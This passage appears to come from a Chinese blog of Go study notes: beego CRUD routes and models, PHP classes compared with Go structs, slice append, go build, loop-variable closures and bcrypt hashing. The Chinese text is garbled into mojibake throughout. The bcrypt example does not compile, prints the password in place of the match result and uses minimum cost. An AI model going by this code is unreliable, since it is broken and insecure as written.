&amp;controllers.ClassifyController&#123;&#125;, <span class="string">"GET:Type"</span>)</span><br><span class="line">beego.Router(<span class="string">"/classifyinsert"</span>, &amp;controllers.ClassifyController&#123;&#125;, <span class="string">"POST:ClassifyInsert"</span>)</span><br><span class="line">beego.Router(<span class="string">"/classifyupdate"</span>, &amp;controllers.ClassifyController&#123;&#125;, <span class="string">"GET:ClassifyUpdate"</span>)</span><br><span class="line">beego.Router(<span class="string">"/classifysave"</span>, &amp;controllers.ClassifyController&#123;&#125;, <span class="string">"POST:ClassifySave"</span>)</span><br><span class="line">beego.Router(<span class="string">"/classifydel"</span>, &amp;controllers.ClassifyController&#123;&#125;, <span class="string">"GET:ClassifyDel"</span>)</span><br><span class="line">modelä¹¦å†™</span><br><span class="line"></span><br><span class="line">package  models</span><br><span class="line"><span class="keyword">import</span>  (</span><br><span class="line">  <span class="string">"github.com/astaxie/beego/orm"</span></span><br><span class="line">)</span><br><span class="line">type  Classify  struct  &#123;</span><br><span class="line">  Id  int</span><br><span class="line">  Name  string</span><br><span class="line">  Content  string</span><br><span class="line">&#125;</span><br><span class="line">func  init()  &#123;</span><br><span class="line">  orm.RegisterModel(<span class="keyword">new</span>(Classify))</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å¢åŠ æ“ä½œ</span></span><br><span class="line">func  InsertClassify(name  string,  content  string)  (int64,  error)  &#123;</span><br><span class="line">  o  :=  orm.NewOrm()</span><br><span class="line">  <span class="keyword">var</span>  clasinfo  Classify</span><br><span class="line">  clasinfo.Name  =  name</span><br><span class="line">  clasinfo.Content  =  content</span><br><span class="line">  id,  <span class="attr">err</span>  :=  o.Insert(&amp;clasinfo)</span><br><span class="line">  <span class="keyword">return</span>  id,  err</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//åˆ é™¤æ“ä½œ</span></span><br><span class="line">func  ClassifyDel(id  int)  ([]Classify,  int64,  error)  &#123;</span><br><span class="line">  o  :=  orm.NewOrm()</span><br><span class="line">  <span class="keyword">var</span>  lists  []Classify</span><br><span class="line">  num,  <span class="attr">err</span>  :=  o.QueryTable(<span class="string">"classify"</span>).Filter(<span class="string">"Id"</span>,  id).Delete()</span><br><span class="line">  o.QueryTable(<span class="string">"inventory"</span>).Filter(<span class="string">"Cid"</span>,  id).Delete()</span><br><span class="line">  <span class="keyword">return</span>  lists,  num,  err</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å±•ç¤º</span></span><br><span class="line">func  ClassifyList()  ([]Classify,  int64,  error)  &#123;</span><br><span class="line">  o  :=  orm.NewOrm()</span><br><span class="line">  <span class="keyword">var</span>  lists  []Classify</span><br><span class="line">  num,  <span class="attr">err</span>  :=  o.QueryTable(<span class="string">"classify"</span>).All(&amp;lists)</span><br><span class="line">  <span class="keyword">return</span>  lists,  num,  err</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ä¿®æ”¹</span></span><br><span class="line">func  ClassifyUpdate(id  int,  name  string,  content  string)  ([]Classify,  int64,  error)  &#123;</span><br><span class="line">  o  :=  orm.NewOrm()</span><br><span class="line">  <span class="keyword">var</span>  lists  []Classify</span><br><span class="line">  num,  <span class="attr">err</span>  :=  o.QueryTable(<span class="string">"classify"</span>).Filter(<span class="string">"Id"</span>,  id).Update(orm.Params&#123;</span><br><span class="line">  <span class="string">"name"</span>:  name,</span><br><span class="line">  <span class="string">"content"</span>:  content,</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">return</span>  lists,  num,  err</span><br><span class="line">&#125;</span><br><span class="line">æ§åˆ¶å™¨</span><br><span class="line"></span><br><span class="line">package  controllers</span><br><span class="line"><span class="keyword">import</span>  (</span><br><span class="line">  <span class="string">"fmt"</span></span><br><span class="line">  <span class="string">"newgo/models"</span></span><br><span class="line">  <span class="string">"strings"</span></span><br><span class="line">  <span class="string">"github.com/astaxie/beego/orm"</span></span><br><span class="line">  <span class="string">"github.com/astaxie/beego"</span></span><br><span class="line">)</span><br><span class="line">type  ClassifyController  struct  &#123;</span><br><span class="line">  beego.Controller</span><br><span class="line">&#125;</span><br><span class="line">func  (c  *ClassifyController)  Get()  &#123;</span><br><span class="line">  c.TplName  =  <span class="string">"index.html"</span></span><br><span class="line">&#125;</span><br><span class="line">func  (c  *ClassifyController)  Type()  &#123;</span><br><span class="line">  list,  num,  <span class="attr">err</span>  :=  models.ClassifyList()</span><br><span class="line">  <span class="keyword">if</span>  err  ==  nil  &#123;</span><br><span class="line">  fmt.Println(list)</span><br><span class="line">  fmt.Println(num)</span><br><span class="line">  &#125;</span><br><span class="line">  c.Data[<span class="string">"comment"</span>]  =  list</span><br><span class="line">  fmt.Println(list)</span><br><span class="line">  c.TplName  =  <span class="string">"type.html"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æ·»åŠ post</span></span><br><span class="line">func  (c  *ClassifyController)  ClassifyInsert()  &#123;</span><br><span class="line">  content  :=  strings.TrimSpace(c.GetString(<span class="string">"content"</span>))</span><br><span class="line">  name  :=  strings.TrimSpace(c.GetString(<span class="string">"name"</span>))</span><br><span class="line">  models.InsertClassify(name,  content)</span><br><span class="line">  c.Ctx.Redirect(<span class="number">302</span>,  <span class="string">"/type"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ä¿®æ”¹getå±•ç¤º</span></span><br><span class="line">func  (c  *ClassifyController)  ClassifySave()  &#123;</span><br><span class="line">  id,  <span class="attr">_</span>  :=  c.GetInt(<span class="string">"id"</span>)</span><br><span class="line">  fmt.Println(id)</span><br><span class="line">  content  :=  strings.TrimSpace(c.GetString(<span class="string">"content"</span>))</span><br><span class="line">  name  :=  strings.TrimSpace(c.GetString(<span class="string">"name"</span>))</span><br><span class="line">  models.ClassifyUpdate(id,  name,  content)</span><br><span class="line">  c.Ctx.Redirect(<span class="number">302</span>,  <span class="string">"/type"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//åˆ é™¤</span></span><br><span class="line">func  (c  *ClassifyController)  ClassifyDel()  &#123;</span><br><span class="line">  id,  <span class="attr">_</span>  :=  c.GetInt(<span class="string">"id"</span>)</span><br><span class="line">  models.ClassifyDel(id)</span><br><span class="line">  c.Ctx.WriteString(<span class="string">"200"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ä¿®æ”¹postæ–¹æ³•</span></span><br><span class="line">func  (c  *ClassifyController)  ClassifyUpdate()  &#123;</span><br><span class="line">  id,  <span class="attr">_</span>  :=  c.GetInt(<span class="string">"id"</span>)</span><br><span class="line">  o  :=  orm.NewOrm()</span><br><span class="line">  type  Comment  struct  &#123;</span><br><span class="line">  Id  int</span><br><span class="line">  Name  string</span><br><span class="line">  Content  string</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span>  comments  []Comment</span><br><span class="line">  <span class="keyword">var</span>  com  []Comment</span><br><span class="line">  num,  <span class="attr">err</span>  :=  o.Raw(<span class="string">"select  *  from  classify  where  id=?"</span>,  id).QueryRows(&amp;comments)</span><br><span class="line">  o.Raw(<span class="string">"select  *  from  classify"</span>).QueryRows(&amp;com)</span><br><span class="line">  <span class="keyword">if</span>  err  ==  nil  &#123;</span><br><span class="line">  fmt.Println(num)</span><br><span class="line">  fmt.Println(comments)</span><br><span class="line">  fmt.Println(com)</span><br><span class="line">  c.Data[<span class="string">"updates"</span>]  =  comments</span><br><span class="line">  c.Data[<span class="string">"comment"</span>]  =  com</span><br><span class="line">  &#125;  <span class="keyword">else</span>  &#123;</span><br><span class="line">  fmt.Println(<span class="string">"æŸ¥è¯¢æŠ¥é”™"</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  c.TplName  =  <span class="string">"type.html"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="php-goçš„ç±»"><a href="#php-goçš„ç±»" class="headerlink" title="php goçš„ç±»"></a>php goçš„ç±»</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace App;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $height;</span><br><span class="line">    public $weight;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name, $height, $weight</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;name = $name;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;height = $height;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;weight = $weight;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [</span><br><span class="line">            <span class="string">'name'</span>   =&gt; $<span class="keyword">this</span>-&gt;name,</span><br><span class="line">            <span class="string">'height'</span> =&gt; $<span class="keyword">this</span>-&gt;height,</span><br><span class="line">            <span class="string">'weight'</span> =&gt; $<span class="keyword">this</span>-&gt;weight,</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//https://learnku.com/articles/26056</span></span><br><span class="line">package main</span><br><span class="line">type Animal struct &#123;</span><br><span class="line">    Name string</span><br><span class="line">    Height uint</span><br><span class="line">    Weight uint</span><br><span class="line">&#125;</span><br><span class="line">func NewAnimal(name string, height, weight uint) Animal &#123;</span><br><span class="line">    <span class="keyword">return</span> Animal&#123;</span><br><span class="line">        Name: name,</span><br><span class="line">        Height: height,</span><br><span class="line">        Weight: weight,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">func (a *Animal) GetInfo() map[string]interface&#123;&#125; &#123;</span><br><span class="line">    <span class="keyword">return</span> map[string]interface&#123;&#125;&#123;</span><br><span class="line">        <span class="string">"name"</span>: a.Name,</span><br><span class="line">        <span class="string">"height"</span>: a.Height,</span><br><span class="line">        <span class="string">"weight"</span>: a.Weight,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Go-for-PHP-Developers-Structs-vs-Classes"><a href="#Go-for-PHP-Developers-Structs-vs-Classes" class="headerlink" title="Go for PHP Developers: Structs vs Classes"></a>Go for PHP Developers: Structs vs Classes</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line">type Animal struct &#123;</span><br><span class="line">    Name string</span><br><span class="line">    Height uint</span><br><span class="line">    Weight uint</span><br><span class="line">&#125;</span><br><span class="line">func NewAnimal(name string, height, weight uint) Animal &#123;</span><br><span class="line">    <span class="keyword">return</span> Animal&#123;</span><br><span class="line">        Name: name,</span><br><span class="line">        Height: height,</span><br><span class="line">        Weight: weight,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//https://learnku.com/articles/26056#reply85350 å®šä¹‰ä¸åŒç±»ä¼¼çš„ç»“æ„ä½“</span></span><br><span class="line">func (a *Animal) GetInfo() map[string]interface&#123;&#125; &#123;</span><br><span class="line">    <span class="keyword">return</span> map[string]interface&#123;&#125;&#123;</span><br><span class="line">        <span class="string">"name"</span>: a.Name,</span><br><span class="line">        <span class="string">"height"</span>: a.Height,</span><br><span class="line">        <span class="string">"weight"</span>: a.Weight,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">package main</span><br><span class="line">type AnimalContract interface &#123;</span><br><span class="line">    GetInfo() map[string]interface&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">type Animal struct &#123;</span><br><span class="line">    <span class="comment">// Struct def...</span></span><br><span class="line">&#125;</span><br><span class="line">func (a *Animal) GetInfo() map[string]interface&#123;&#125; &#123;</span><br><span class="line">    <span class="comment">// Method body... ç»§æ‰¿AnimalContract å¦‚æœæˆ‘ä»¬å®šä¹‰ä¸€ä¸ªå®šä¹‰è¯¥æ¥å£çš„ç»“æ„ï¼Œå®ƒå°†éšå¼ç»§æ‰¿å®ƒã€‚</span></span><br><span class="line">&#125;</span><br><span class="line">package main</span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line">func main()&#123;</span><br><span class="line">   <span class="keyword">var</span> array = [<span class="number">9</span>]interface&#123;&#125;&#123;<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="string">"index"</span>&#125;</span><br><span class="line">   fmt.Print(array)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="append-æ‰©å®¹"><a href="#append-æ‰©å®¹" class="headerlink" title="append æ‰©å®¹"></a>append æ‰©å®¹</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">package array</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * arr åº•å±‚æ‰©å®¹çŸ¥è¯†ç‚¹https://learnku.com/articles/27630#topnav</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">func ArrayAppend() []int &#123;</span><br><span class="line">    arr := make([]int,<span class="number">5</span>)</span><br><span class="line">    fmt.Printf(<span class="string">"arr.len: %d; arr.cap: %d \n"</span>, len(arr),cap(arr))</span><br><span class="line">    arr = append(arr,<span class="number">10</span>)</span><br><span class="line">    <span class="comment">//é—®ç°åœ¨ arr ç»“æœæ˜¯ä»€ä¹ˆ</span></span><br><span class="line">    fmt.Printf(<span class="string">"arr.len: %d; arr.cap: %d \n"</span>, len(arr),cap(arr))</span><br><span class="line">    <span class="keyword">return</span> arr</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="go-build"><a href="#go-build" class="headerlink" title="go build"></a>go build</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">å·¥ä½œåŒºæ˜¯ Go ä¾¿æ·ç®¡ç†é¡¹ç›®çš„æ–¹å¼ã€‚ä¸€è¨€ä»¥è”½ä¹‹ï¼Œå®ƒå°±æ˜¯ä½ ç³»ç»Ÿä¸Šçš„ä¸€ä¸ªç›®å½•ï¼ŒGo å¯ä»¥åœ¨æ­¤ æŸ¥æ‰¾æºç  æ–‡ä»¶ï¼Œç®¡ç†ä¾èµ–åŒ… è¿˜æœ‰ åˆ†å‘äºŒè¿›åˆ¶æ–‡ä»¶ã€‚ å½“ Go ç¨‹åºå‘½ä¸­ <span class="keyword">import</span> è¯­å¥ï¼Œå®ƒå°±ä¼šå» Go æ ‡å‡†åº“ (*$GOROOT/src*) ä¸­å¯»æ‰¾å“åº”çš„åŒ…ã€‚å¦‚æœæ²¡æ‰¾åˆ°ï¼Œç„¶å Go å°±ä¼šå¼•ç”¨ç¯å¢ƒå˜é‡ GOPATH ï¼Œå®ƒæ˜¯ Go å·¥ä½œåŒºç›®å½•çš„è·¯å¾„ï¼Œç„¶åå†å» $GOPATH/src ç›®å½•ä¸‹å¯»æ‰¾è¿™ä¸ªåŒ…ã€‚</span><br><span class="line"></span><br><span class="line">ä½ å¯ä»¥æŒ‰éœ€æŒ‡å®šå¤šä¸ªå·¥ä½œåŒºï¼Œåªè¦ä½ ä¿è¯ GOPATH ç¯å¢ƒå˜é‡æŒ‡å‘ä½ çš„å·¥ä½œåŒºç›®å½•å³å¯ã€‚</span><br><span class="line">ä¸€ä¸ª Go å·¥ä½œåŒºç›®å½•å¿…é¡»æœ‰ä¸‰ä¸ªå­ç›®å½•ä¹Ÿå°±æ˜¯: src, pkg and bin</span><br><span class="line">src ç›®å½•åŒ…å« Package. Package åŒ…æ‹¬ä¸€ä¸ªåŒ…å« Go æºä»£ç  (*.go* files) ã€‚ ä»»ä½•ä½¿ç”¨ <span class="string">'go get'</span> å‘½ä»¤å®‰è£…çš„åŒ…ä¹Ÿå°†é©»ç•™åœ¨è¿™é‡Œ (åŠå…¶ä¾èµ–åŒ…)ã€‚</span><br><span class="line"></span><br><span class="line">åœ¨ Go ä¸­ï¼Œæ¯ä¸ªç¨‹åºéƒ½åŒ…å«åœ¨ä¸€ä¸ªåŒ…ä¸­ã€‚ å› æ­¤ï¼Œæ— è®ºä½•æ—¶æ‚¨å°†ä½¿ç”¨æ–°çš„ Go é¡¹ç›®ï¼Œæ‚¨éƒ½éœ€è¦åœ¨ $GOPATH/src ä¸­åˆ›å»ºæ–°ç›®å½•å¹¶å‘ä¸Šå·¥ä½œã€‚</span><br><span class="line">å½“æ‰§è¡Œ go run hello.go å‘½ä»¤æ—¶ï¼ŒGo ç¼–è¯‘å™¨ä¼šé¦–å…ˆç¼–è¯‘ hello.go æ–‡ä»¶ï¼Œç„¶åæ‰§è¡Œé‡Œé¢çš„äºŒè¿›åˆ¶ä»£ç ã€‚</span><br><span class="line"></span><br><span class="line">Go ç¨‹åºæ”¯æŒè¾“å‡ºäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ‰§è¡Œ go build &lt;package-name&gt; (main åŒ…) æˆ– go build program/path.go å‘½ä»¤å³å¯åœ¨å½“å‰æ–‡ä»¶å¤¹åˆ›å»ºäºŒè¿›åˆ¶æ–‡ä»¶ã€‚</span><br><span class="line">æ‰§è¡Œ go install å‘½ä»¤å°±å¯ä»¥åˆ›å»ºè¿™äº›æ–‡ä»¶ã€‚ go install å‘½ä»¤ä¼šè§¦å‘åº•å±‚çš„ go build å‘½ä»¤ï¼Œç„¶åå°†è¿™äº›æ–‡ä»¶ä¿å­˜åˆ° bin ç›®å½•ä¸­ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œè¿™ä¸ªç›®å½•æ˜¯åœ¨ç³»ç»Ÿçš„å¯æ‰§è¡Œè·¯å¾„ä¸­ã€‚å› æ­¤ï¼Œè¿™ä¸ªç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶éƒ½æ˜¯å¯ä»¥é€šè¿‡ç»ˆç«¯æ¥æ“ä½œçš„ã€‚</span><br><span class="line">https:<span class="comment">//learnku.com/golang/t/26863</span></span><br><span class="line">go run main.go </span><br><span class="line">go build main.go</span><br><span class="line">go install test #main.goåœ¨testç›®å½•</span><br></pre></td></tr></table></figure>
<h3 id="for-å¾ªç¯è¿­ä»£å˜é‡"><a href="#for-å¾ªç¯è¿­ä»£å˜é‡" class="headerlink" title="for å¾ªç¯è¿­ä»£å˜é‡"></a>for å¾ªç¯è¿­ä»£å˜é‡</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> slice []func()</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	sli := []int&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line">	<span class="keyword">for</span> _, <span class="attr">v</span> := range sli &#123;</span><br><span class="line">		fmt.Println(&amp;v)</span><br><span class="line">		slice = append(slice, func()&#123;</span><br><span class="line">			fmt.Println(v * v) <span class="comment">// ç›´æ¥æ‰“å°ç»“æœ</span></span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//v åœ¨ for å¾ªç¯å¼•è¿›çš„ä¸€ä¸ªå—ä½œç”¨åŸŸå†…è¿›è¡Œå£°æ˜ã€‚åœ¨å¾ªç¯é‡Œåˆ›å»ºçš„æ‰€æœ‰å‡½æ•°å˜é‡å…±äº«ç›¸åŒçš„å˜é‡ï¼Œå°±æ˜¯ä¸€ä¸ªå¯è®¿é—®çš„å­˜å‚¨ä½ç½®ï¼Œè€Œä¸æ˜¯å›ºå®šçš„å€¼ã€‚(ä½ ä¼šæƒŠå¥‡çš„å‘ç° &amp;v çš„å†…å­˜åœ°å€æ˜¯ä¸€æ ·çš„)https://www.njphper.com/posts/974e86a6.html</span></span><br><span class="line">	<span class="keyword">for</span> _, <span class="attr">val</span>  := range slice &#123;</span><br><span class="line">		val()</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è¾“å‡º 25 25 25 25 25</span></span><br><span class="line"><span class="keyword">var</span> slice []func()</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	sli := []int&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line">	<span class="keyword">for</span> _, <span class="attr">v</span> := range sli &#123;</span><br><span class="line">	    temp := v <span class="comment">// å…¶å®å¾ˆç®€å• å¼•å…¥ä¸€ä¸ªä¸´æ—¶å±€éƒ¨å˜é‡å°±å¯ä»¥äº†ï¼Œè¿™æ ·å°±å¯ä»¥å°†æ¯æ¬¡çš„å€¼å­˜å‚¨åˆ°è¯¥å˜é‡åœ°å€ä¸Š</span></span><br><span class="line">		fmt.Println(&amp;temp) <span class="comment">// è¿™é‡Œå†…å­˜åœ°å€æ˜¯ä¸åŒçš„</span></span><br><span class="line">		slice = append(slice, func()&#123;</span><br><span class="line">			fmt.Println(temp *  temp) <span class="comment">// ç›´æ¥æ‰“å°ç»“æœ</span></span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span> _, <span class="attr">val</span>  := range slice &#123;</span><br><span class="line">		val()</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è¾“å‡º 1, 4, 9, 16, 25 é¢„æœŸç»“æœ</span></span><br></pre></td></tr></table></figure>
<h3 id="å®ç°-PHP-çš„å¯†ç åŠ å¯†è§£å¯†"><a href="#å®ç°-PHP-çš„å¯†ç åŠ å¯†è§£å¯†" class="headerlink" title="å®ç° PHP çš„å¯†ç åŠ å¯†è§£å¯†"></a>å®ç° PHP çš„å¯†ç åŠ å¯†è§£å¯†</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line">#https://www.njphper.com/posts/f3f0ab9c.html</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">    <span class="string">"log"</span></span><br><span class="line">    <span class="string">"golang.org/x/crypto/bcrypt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">       <span class="comment">// è¾“å…¥å¯†ç  è·å– hash å€¼</span></span><br><span class="line">        pwd := getPwd()</span><br><span class="line">        hash := hashAndSalt(pwd)</span><br><span class="line">       <span class="comment">// å†æ¬¡è¾“å…¥å¯†ç éªŒè¯</span></span><br><span class="line">        pwd2 := getPwd()</span><br><span class="line">        pwdMatch := comparePasswords(hash, pwd2)</span><br><span class="line">        fmt.Println(<span class="string">"Passwords Match?"</span>, pwd)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func getPwd() []byte &#123;</span><br><span class="line">    fmt.Println(<span class="string">"Enter a password"</span>)</span><br><span class="line">    <span class="keyword">var</span> pwd string</span><br><span class="line">    _, <span class="attr">err</span> := fmt.Scan(&amp;pwd)</span><br><span class="line">    <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">        log.Println(err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> []byte(pwd)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">func hashAndSalt(pwd []byte) string &#123;</span><br><span class="line">    hash, <span class="attr">err</span> := bcrypt.GenerateFromPassword(pwd, bcrypt.MinCost)</span><br><span class="line">    <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">        log.Println(err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> string(hash)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func comparePasswords(hashedPwd string, plainPwd []byte) bool &#123;</span><br><span class="line">    byteHash := []byte(hashedPwd)</span><br><span class="line"></span><br><span class="line">    err := bcrypt.CompareHashAndPassword(byteHash, plainPwd)</span><br><span class="line">    <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">        log.Println(err)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line">str := <span class="string">`&#123;"page": 1, "fruits": ["apple", "peach"]&#125;`</span></span><br><span class="line">å®ä¾‹åŒ–äº†ä¸€ä¸ª json å­—ç¬¦ä¸²ï¼Œfruits å¯¹åº”çš„æ˜¯ä¸€ä¸ªæ•°ç»„ã€‚</span><br><span class="line">åœ¨ Go è¯­è¨€ä¸­ï¼Œå­—ç¬¦ä¸²å­—é¢é‡å¯ä»¥ä½¿ç”¨åŒå¼•å· <span class="string">""</span> æˆ–è€…åå¼•å· <span class="string">' æ¥åˆ›å»º</span></span><br></pre></td></tr></table></figure>
